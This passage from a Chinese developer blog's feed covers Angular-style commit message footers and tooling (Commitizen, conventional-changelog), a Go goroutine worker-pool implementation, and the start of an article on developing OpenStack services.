<li>应该说明代码变动的动机，以及与以前行为的对比。<br>下面是一个angular项目下面的一个范例。<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Protractor users were having a problem <span class="built_in">where</span> <span class="keyword">if</span> they had asynchonous code <span class="keyword">in</span> a</div><div class="line">`route.resolve` or `route.resolveRedirectTo` variable, Protractor was not</div><div class="line">waiting <span class="keyword">for</span> that code to complete before continuing. See</div><div class="line">angular/protractor<span class="comment">#789 (comment) for</span></div><div class="line">details.</div><div class="line"></div><div class="line">This commit fixes it by ensuring that `<span class="variable">$browser</span><span class="comment">#outstandingRequestCount` is</span></div><div class="line">properly increased/decreased <span class="keyword">while</span> `<span class="variable">$route</span>` (asynchronously) processes a route.</div><div class="line"></div><div class="line">Also, enhanced `ngMock` to <span class="built_in">wait</span> <span class="keyword">for</span> pending requests, before calling callbacks</div><div class="line">from `<span class="variable">$browser</span>.notifyWhenNoOutstandingRequests()`.</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h3><p>该部分主要是用于变更过会的一些后续操作的, 比如关闭issue, 撤销之前的commit等</p>
<h4 id="关闭Issue"><a href="#关闭Issue" class="headerlink" title="关闭Issue"></a>关闭Issue</h4><p>如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue 。也可以一次关闭多个issue<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Closes <span class="comment">#112</span></div></pre></td></tr></table></figure></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Closes <span class="comment">#221, 222, 223</span></div></pre></td></tr></table></figure>
<h4 id="撤销之前的commit"><a href="#撤销之前的commit" class="headerlink" title="撤销之前的commit"></a>撤销之前的commit</h4><p>如果当前 commit 用于撤销以前的 commit，则必须以revert:开头，后面跟着被撤销 Commit 的 Header。<br>Body部分的格式是固定的，必须写成This reverts commit <code>hash</code>.，其中的<code>hash</code>是被撤销 commit 的 SHA 标识符。<br>如果当前 commit 与被撤销的 commit，在同一个发布（release）里面，那么它们都不会出现在 Change log 里面。如果两者在不同的发布，那么当前 commit，会出现在 Change log 的Reverts小标题下面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">revert: feat(pencil): add <span class="string">'graphiteWidth'</span> option</div><div class="line"></div><div class="line">This reverts commit 667ecc1654a317a13331b17617d973392f415f02.</div></pre></td></tr></table></figure></p>
<h4 id="不兼容变动"><a href="#不兼容变动" class="headerlink" title="不兼容变动"></a>不兼容变动</h4><p>如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">BREAKING CHANGE: isolate scope bindings definition has changed.</div><div class="line"></div><div class="line">    To migrate the code follow the example below:</div><div class="line"></div><div class="line">    Before:</div><div class="line"></div><div class="line">    scope: &#123;</div><div class="line">      myAttr: <span class="string">'attribute'</span>,</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    After:</div><div class="line"></div><div class="line">    scope: &#123;</div><div class="line">      myAttr: <span class="string">'@'</span>,</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    The removed `inject` wasn<span class="string">'t generaly useful for directives so there should be no code using it.</span></div></pre></td></tr></table></figure></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>基于commit message有丰富的工具，包括编辑器，校验工具，以及生成Change log的工具</p>
<h3 id="Commitizen编辑工具"><a href="#Commitizen编辑工具" class="headerlink" title="Commitizen编辑工具"></a>Commitizen编辑工具</h3><p>Commitizen是一个撰写合格 Commit message 的工具, 详细说明<a href="https://github.com/commitizen/cz-cli" target="_blank" rel="external">github地址</a></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>1) 全局安装(记得使用淘宝源来加速)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ npm install -g commitizen</div><div class="line">➜  ~ npm install -g cz-conventional-changelog</div><div class="line"><span class="built_in">echo</span> <span class="string">'&#123; "path": "cz-conventional-changelog" &#125;'</span> &gt; ~/.czrc</div></pre></td></tr></table></figure></p>
<p>2）局部安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ npm install commitizen -g</div><div class="line">➜  ~ commitizen init cz-conventional-changelog --save-dev --save-exact</div></pre></td></tr></table></figure></p>
<p>主要如果报package.json不存在,需要添加这个文件, 这是nodejs的包管理文件, 格式可以参数<a href="https://github.com/commitizen/cz-cli/blob/master/package.json" target="_blank" rel="external">commitizen包的package.json</a></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜  device git:(master) ✗ git cz</div><div class="line">cz-cli@2.9.5, cz-conventional-changelog@1.2.0</div><div class="line"></div><div class="line"></div><div class="line">Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.</div><div class="line"></div><div class="line">? Select the <span class="built_in">type</span> of change that you<span class="string">'re committing: (Use arrow keys)</span></div><div class="line">❯ feat:     A new feature</div><div class="line">  fix:      A bug fix</div><div class="line">  docs:     Documentation only changes</div><div class="line">  style:    Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)</div><div class="line">  refactor: A code change that neither fixes a bug nor adds a feature</div><div class="line">  perf:     A code change that improves performance</div><div class="line">  test:     Adding missing tests or correcting existing tests</div><div class="line">(Move up and down to reveal more choices)</div></pre></td></tr></table></figure>
<h3 id="validate-commit-msg校验工具"><a href="#validate-commit-msg校验工具" class="headerlink" title="validate-commit-msg校验工具"></a>validate-commit-msg校验工具</h3><p>validate-commit-msg 用于检查 Node 项目的 Commit message 是否符合格式。我暂时不需要,<a href="https://github.com/kentcdodds/validate-commit-msg" target="_blank" rel="external">github地址</a></p>
<h3 id="生成Change-log的工具"><a href="#生成Change-log的工具" class="headerlink" title="生成Change log的工具"></a>生成Change log的工具</h3><p>conventional-changelog 就是生成 Change log 的工具，运行下面的命令即可。<br>我已经使用setuptools的pbr来管理change log, 因此我咱不适用这个工具,关于<a href="http://docs.openstack.org/developer/pbr/" target="_blank" rel="external">pbr说明</a><br>如果是其他项目可以考虑这个工具<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ npm install -g conventional-changelog</div><div class="line">$ <span class="built_in">cd</span> my-project</div><div class="line">$ conventional-changelog -p angular -i CHANGELOG.md -w</div></pre></td></tr></table></figure></p>
<p>上面命令不会覆盖以前的 Change log，只会在CHANGELOG.md的头部加上自从上次发布以来的变动。<br>如果你想生成所有发布的 Change log，要改为运行下面的命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0</div></pre></td></tr></table></figure></p>
<p>为了方便使用，可以将其写入package.json的scripts字段。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"scripts"</span>: &#123;</div><div class="line">    <span class="string">"changelog"</span>: <span class="string">"conventional-changelog -p angular -i CHANGELOG.md -w -r 0"</span></div><div class="line">  &#125;&#125;</div></pre></td></tr></table></figure></p>
<p>以后，直接运行下面的命令即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm run changelog</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/angular-commit-message.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="开发工具" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
      <category term="git" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/git/"/>
    
    
  </entry>
  
  <entry>
    <title>Golang并发编程-协程池</title>
    <link href="https://blog.yumaojun.net/2017/01/12/goroutine-pool/"/>
    <id>https://blog.yumaojun.net/2017/01/12/goroutine-pool/</id>
    <published>2017-01-12T13:29:14.000Z</published>
    <updated>2017-01-15T05:37:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要<br><a id="more"></a></p>
<h2 id="如何高并发"><a href="#如何高并发" class="headerlink" title="如何高并发"></a>如何高并发</h2><p>并发模式下有很多问题需要我们关注, 因此我们设计出来的goroutine pool应该关注如下一些问题</p>
<h3 id="goroutine的高并发"><a href="#goroutine的高并发" class="headerlink" title="goroutine的高并发"></a>goroutine的高并发</h3><p><code>goroutine</code>的一个主要特性就是它们的消耗；创建它们的初始内存成本很低(与需要1至8MB内存的传统<code>POSIX</code>线程形成鲜明对比)以及根据需要动态增长和缩减占用的资源。这使得<code>goroutine</code>会从<code>4096</code>字节的初始栈内存占用开始按需增长或缩减内存占用, 在一般的需求下, 我们无需担心资源的耗尽。</p>
<p>Go语言通过系统的线程来多路派遣这些函数的执行，使得每个用go关键字执行的函数可以运行成为一个单位协程。当一个协程阻塞的时候，调度器就会自动把其他协程安排到另外的线程中去执行，从而实现了程序无等待并行化运行。而且调度的开销非常小，一颗CPU调度的规模不下于每秒百万次，这使得我们能够创建大量的<code>goroutine</code>，从而可以很轻松地编写高并发程序，达到我们想要的目的</p>
<p>简单来说：协程十分轻量，可以在一个进程中执行有数以十万计的协程，依旧保持高性能。</p>
<p>因此我们使用<code>goroutine</code>处理任务, 大概模型为：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	fmt.Println(s)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> _, word := <span class="keyword">range</span> []<span class="keyword">string</span>&#123;<span class="string">"hello"</span>, <span class="string">"world"</span>, <span class="string">"this"</span>, <span class="string">"is"</span>, <span class="string">"my"</span>, <span class="string">"goroutine"</span>, <span class="string">"test"</span>&#125; &#123;</div><div class="line">		<span class="keyword">go</span> say(word) <span class="comment">//开一个新的Goroutines执行</span></div><div class="line">	&#125;</div><div class="line">	time.Sleep(time.Second * <span class="number">1</span>) <span class="comment">// 等待goroutine跑完, 我为了方便使用了sleep的方式</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="利用协序池做并发控制"><a href="#利用协序池做并发控制" class="headerlink" title="利用协序池做并发控制"></a>利用协序池做并发控制</h3><p>虽然goroutine很便宜, 但也不是免费的, 总有一个时候你系统会扛不住，我们不能天真的对goroutine的数量不加限制的使用, 因此我们需要一种并发的限制机制来保证程序的稳定, 使得程序不会因为过多的goroutine而崩溃, 至于多少个goroutine 就需要根据自己环境测试得出。</p>
<p>如何对goroutine做并发限制喃？使用Java和C概念中的线程池来处理是个不错的方法，我们会使用Channel实现Queue+Worker模型, 整个过程：将请求都转发给一个channel，然后初始化多个goroutine读取这个channel中的内容，并进行处</p>
<h3 id="避免接收Channel阻塞"><a href="#避免接收Channel阻塞" class="headerlink" title="避免接收Channel阻塞"></a>避免接收Channel阻塞</h3><p>如果channel初始化时是没有设置长度的，此时如果协序池都满负荷工作，再有请求过来的话，仍然会出现被block的情况，而且会比没有经过优化的方案还要慢</p>
<p>遇到这种情况，我们应该希望模块能够及时告知调用方，“我已经达到处理极限了，无法给你处理请求了”。其实，这种需求，可以很简单的在Golang中实现：如果channel发送以及接收操作在select语句中执行并且发生阻塞，default语句就会立即执行。</p>
<h3 id="接收执行结果"><a href="#接收执行结果" class="headerlink" title="接收执行结果"></a>接收执行结果</h3><p>我们既需要把结果发送给某个channel，获取到处理这次请求的结果。解决的方法是：将一个channel实例包含在请求中，goroutine处理完成后将结果写回这个channel</p>
<h3 id="任务超时机制"><a href="#任务超时机制" class="headerlink" title="任务超时机制"></a>任务超时机制</h3><p>即使是复杂、耗时的任务，也必须设置超时时间。一方面可能是业务对此有时限要求（用户必须在XX分钟内看到结果），另一方面模块本身也不能都消耗在一直无法结束的任务上，使得其他请求无法得到正常处理。因此，也需要对处理流程增加超时机制。</p>
<p>我一般设置超时的方案是：和之前提到的“接收发送给channel之后返回的结果”结合起来，在等待返回channel的外层添加select，并在其中通过time.After()来判断超时</p>
<h3 id="协程的优雅退出"><a href="#协程的优雅退出" class="headerlink" title="协程的优雅退出"></a>协程的优雅退出</h3><p>协序池里面的协序我们也需要优雅退出，解决方法很简单, 直接通过select监听一个退出channel, 等待外部通知, 好终止协程</p>
<h2 id="实现协程池"><a href="#实现协程池" class="headerlink" title="实现协程池"></a>实现协程池</h2><p>接下里我们将实现一个满足上述需求的Goroutine pool</p>
<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="http://oiw1gzfww.bkt.clouddn.com/goroutine-pool.png" alt=""></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="string">"os"</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> (</div><div class="line">	<span class="comment">// MaxWorker is the number of goroutine worker to start</span></div><div class="line">	MaxWorker = os.Getenv(<span class="string">"MAX_WORKERS"</span>)</div><div class="line">	<span class="comment">// MaxQueue is the job Queue buffered lenth</span></div><div class="line">	MaxQueue = os.Getenv(<span class="string">"MAX_QUEUE"</span>)</div><div class="line">	<span class="comment">// JobQueue is a buffered channel that we can send work requests on.</span></div><div class="line">	JobQueue <span class="keyword">chan</span> Job</div><div class="line">	<span class="comment">// WorkerPool is a pool of workers that are instantianted to perform the work</span></div><div class="line">	WorkerPool <span class="keyword">chan</span> <span class="keyword">chan</span> Job</div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// Job represents the job to be run</span></div><div class="line"><span class="keyword">type</span> Job <span class="keyword">struct</span> &#123;</div><div class="line">	ID   <span class="keyword">int</span></div><div class="line">	task <span class="function"><span class="keyword">func</span><span class="params">()</span></span></div><div class="line">&#125;</div><div class="line"></div><div class="line">// <span class="title">Worker</span> <span class="title">represents</span> <span class="title">the</span> <span class="title">worker</span> <span class="title">that</span> <span class="title">executes</span> <span class="title">the</span> <span class="title">job</span></div><div class="line"><span class="title">type</span> <span class="title">Worker</span> <span class="title">struct</span> &#123;</div><div class="line">	ID          <span class="keyword">int</span></div><div class="line">	InputQueue  <span class="keyword">chan</span> Job</div><div class="line">	OutputQueue <span class="keyword">chan</span> Result</div><div class="line">	QuitQueue   <span class="keyword">chan</span> <span class="keyword">bool</span></div><div class="line">	WorkerPool  <span class="keyword">chan</span> <span class="keyword">chan</span> Job</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Result use to collect the task result</span></div><div class="line"><span class="keyword">type</span> Result <span class="keyword">struct</span> &#123;</div><div class="line">	JobID <span class="keyword">int</span></div><div class="line">	Data  <span class="keyword">interface</span>&#123;&#125;</div><div class="line">	Err   error</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// GoroutinePool is a pool of workers channels that are registered with the GoroutinePool</span></div><div class="line"><span class="keyword">type</span> GoroutinePool <span class="keyword">struct</span> &#123;</div><div class="line">	maxWorkers  <span class="keyword">int</span></div><div class="line">	maxQueue    <span class="keyword">int</span></div><div class="line">	JobQueue    <span class="keyword">chan</span> Job</div><div class="line">	ResultQueue <span class="keyword">chan</span> Result</div><div class="line">	WorkerPool  <span class="keyword">chan</span> <span class="keyword">chan</span> Job</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// NewWorker is factory function to new a worker</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWorker</span><span class="params">(id <span class="keyword">int</span>, workerPool <span class="keyword">chan</span> <span class="keyword">chan</span> Job)</span> *<span class="title">Worker</span></span> &#123;</div><div class="line">	worker := Worker&#123;</div><div class="line">		ID:          id,</div><div class="line">		InputQueue:  <span class="built_in">make</span>(<span class="keyword">chan</span> Job),</div><div class="line">		OutputQueue: <span class="built_in">make</span>(<span class="keyword">chan</span> Result),</div><div class="line">		WorkerPool:  workerPool,</div><div class="line">		QuitQueue:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>),</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> &amp;worker</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Start method starts the run loop for the worker, listening for a quit channel</span></div><div class="line"><span class="comment">// in case we need to stop it</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w Worker)</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		<span class="keyword">for</span> &#123;</div><div class="line">			<span class="comment">// register the current worker into the worker queue.</span></div><div class="line">			w.WorkerPool &lt;- w.InputQueue</div><div class="line"></div><div class="line">			<span class="keyword">select</span> &#123;</div><div class="line">			<span class="comment">// we have received a work request</span></div><div class="line">			<span class="keyword">case</span> job := &lt;-w.InputQueue:</div><div class="line">				job.task()</div><div class="line">			<span class="comment">// we have received a signal to stop</span></div><div class="line">			<span class="keyword">case</span> &lt;-w.QuitQueue:</div><div class="line">				<span class="keyword">return</span></div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Stop signals the worker to stop listening for work requests.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w Worker)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		w.QuitQueue &lt;- <span class="literal">true</span></div><div class="line">	&#125;()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// NewGoroutinePool is a factory function to new a GoroutinePool</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGoroutinePool</span><span class="params">(maxWorkers <span class="keyword">int</span>, maxQueue <span class="keyword">int</span>)</span> *<span class="title">GoroutinePool</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> &amp;GoroutinePool&#123;</div><div class="line">		WorkerPool:  <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> Job, maxWorkers),</div><div class="line">		JobQueue:    <span class="built_in">make</span>(<span class="keyword">chan</span> Job, maxQueue),</div><div class="line">		ResultQueue: <span class="built_in">make</span>(<span class="keyword">chan</span> Result, maxQueue),</div><div class="line">		maxWorkers:  maxWorkers,</div><div class="line">		maxQueue:    maxQueue,</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// dispatch use to dispatch the job</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *GoroutinePool)</span> <span class="title">dispatch</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		<span class="keyword">select</span> &#123;</div><div class="line">		<span class="keyword">case</span> job := &lt;-d.JobQueue:</div><div class="line">			<span class="comment">// a job request has benn received</span></div><div class="line">			<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(job Job)</span></span> &#123;</div><div class="line">				<span class="comment">// try to obtain a worker job channel that is available.</span></div><div class="line">				<span class="comment">// this will block until a worker is idle</span></div><div class="line">				jobChan := &lt;-d.WorkerPool</div><div class="line"></div><div class="line">				<span class="comment">// dispatch the job to the worker jobChan</span></div><div class="line">				jobChan &lt;- job</div><div class="line">			&#125;(job)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Run use to starting n number os workers</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *GoroutinePool)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; d.maxWorkers; i++ &#123;</div><div class="line">		worker := NewWorker(i+<span class="number">1</span>, d.WorkerPool)</div><div class="line">		worker.Start()</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">go</span> d.dispatch()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// AddJob is a method to add job to job channel</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *GoroutinePool)</span> <span class="title">AddJob</span><span class="params">(job Job)</span> <span class="params">(msg <span class="keyword">string</span>, err error)</span></span> &#123;</div><div class="line">	JobQueue &lt;- job</div><div class="line">	<span class="keyword">return</span> <span class="string">"add a job to Job queue"</span>, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="goroutine" scheme="https://blog.yumaojun.net/tags/goroutine/"/>
    
  </entry>
  
  <entry>
    <title>如何开发Openstack服务-开篇(一)</title>
    <link href="https://blog.yumaojun.net/2017/01/10/develop-openstack-service/"/>
    <id>https://blog.yumaojun.net/2017/01/10/develop-openstack-service/</id>
    <published>2017-01-10T14:06:53.000Z</published>
    <updated>2017-01-12T07:31:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/openstack.develop.png" alt=""><br><a id="more"></a></p>
<p>openstack是我见过最大最复杂的python项目, 虽然openstack项目的热度在下滑, 但是openstack这套开发理念任然是相当不错的，值得我们学习. 由于工作需要, 我也需要开发一些自定义的openstack服务, 因此想将开发openstack服务的过程以一系列的文章记录下来, 方便需要的人。</p>
<h2 id="openstack简介"><a href="#openstack简介" class="headerlink" title="openstack简介"></a>openstack简介</h2><p>openstack是一个IaaS平台, 提供计算服务、网络服务、存储服务等, 有3种方式使用openstack提供的服务</p>
<ul>
<li>API<br>通过API使用OpenStack的方式是由各个服务自己实现的, 这些API都是有统一的形式的，都是采用了HTTP协议实现的符合REST规范的API。</li>
<li>CLI/SDK<br>通过命令行是用OpenStack服务的方式是由一系列项目来提供的，这些项目一般都命名为python-projectclient，比如python-keystoneclient，python-novaclietn等。这些命令行项目分别对应到各个主要的服务，为用户提供命令行操作界面和Python的SDK。比如python-keystoneclient对应到keystone，为用户提供了keystone这个命令，同时也提供了keyston项目的SDK（其实是在SDK的基础上实现了命令行）。这些client项目提供的SDK其实也是封装了对各自服务的API的调用。由于每个主要项目都有一个自己的命令行工具，社区觉得不好，于是又有了一个新的项目python-openstackclient，用来提供一个统一的命令行工具openstack（命令的名字就叫做openstack），这个工具实现了命令行，然后使用各个服务的client项目提供的SDK来完成对应的操作</li>
<li>WebUI<br>通过Web界面使用OpenStack服务这种方式是通过OpenStack的Horizon项目提供的。Horizon项目是一个Django应用，实现了一个面板功能，是传统的MVC开发模型, 不过最新的项目 在慢慢往Angular上迁移。Horizon项目主要是提供一种交互界面，它会通过API来和各个OpenStack服务进行交互，然后在Web界面上展示各个服务的状态；它也会接收用户的操作，然后调用各个服务的API来完成用户对各个服务的使用</li>
</ul>
<p>因此开发一个完整的openstack项目需要完成上面介绍的3部分的开发，当然API服务是根本。</p>
<h2 id="openstack架构"><a href="#openstack架构" class="headerlink" title="openstack架构"></a>openstack架构</h2><p>整个openstack的服务是以插件化得方式进行独立开发, 然后通过API相互关联, 比如:<br><img src="http://oiw1gzfww.bkt.clouddn.com/openstack-conceptual-arch-folsom.jpg" alt=""><br>接下来我们会以demo的形式开发一个和openstack服务类似的服务，该服务的名称就叫demo</p>
<h2 id="openstack中的api服务"><a href="#openstack中的api服务" class="headerlink" title="openstack中的api服务"></a>openstack中的api服务</h2><p>openstack的API设计风格为RESTful, 如何设计RESTful API我在前面的博客中有介绍, Python的Web开发框架很多，基本上，还活跃的框架都支持<code>RESTful API</code>的开发, 有些框架还专门为<code>RESTful API</code>的开发提供了便利的功能,比如<code>Pecan</code>，有些框架则通过第三方模块来提供这种便利，比如<code>Django</code>和<code>Flask</code>都有不少和REST相关的第三方库。<br>对于框架选择，也没有什么特别好的标准，一般都是比较性能、文档、社区是否活跃等。在我看来，选择流行的一般就不会错<br>下面是openstack keystone关于credential的API:<br><img src="http://oiw1gzfww.bkt.clouddn.com/openstack-restful-api.png" alt=""></p>
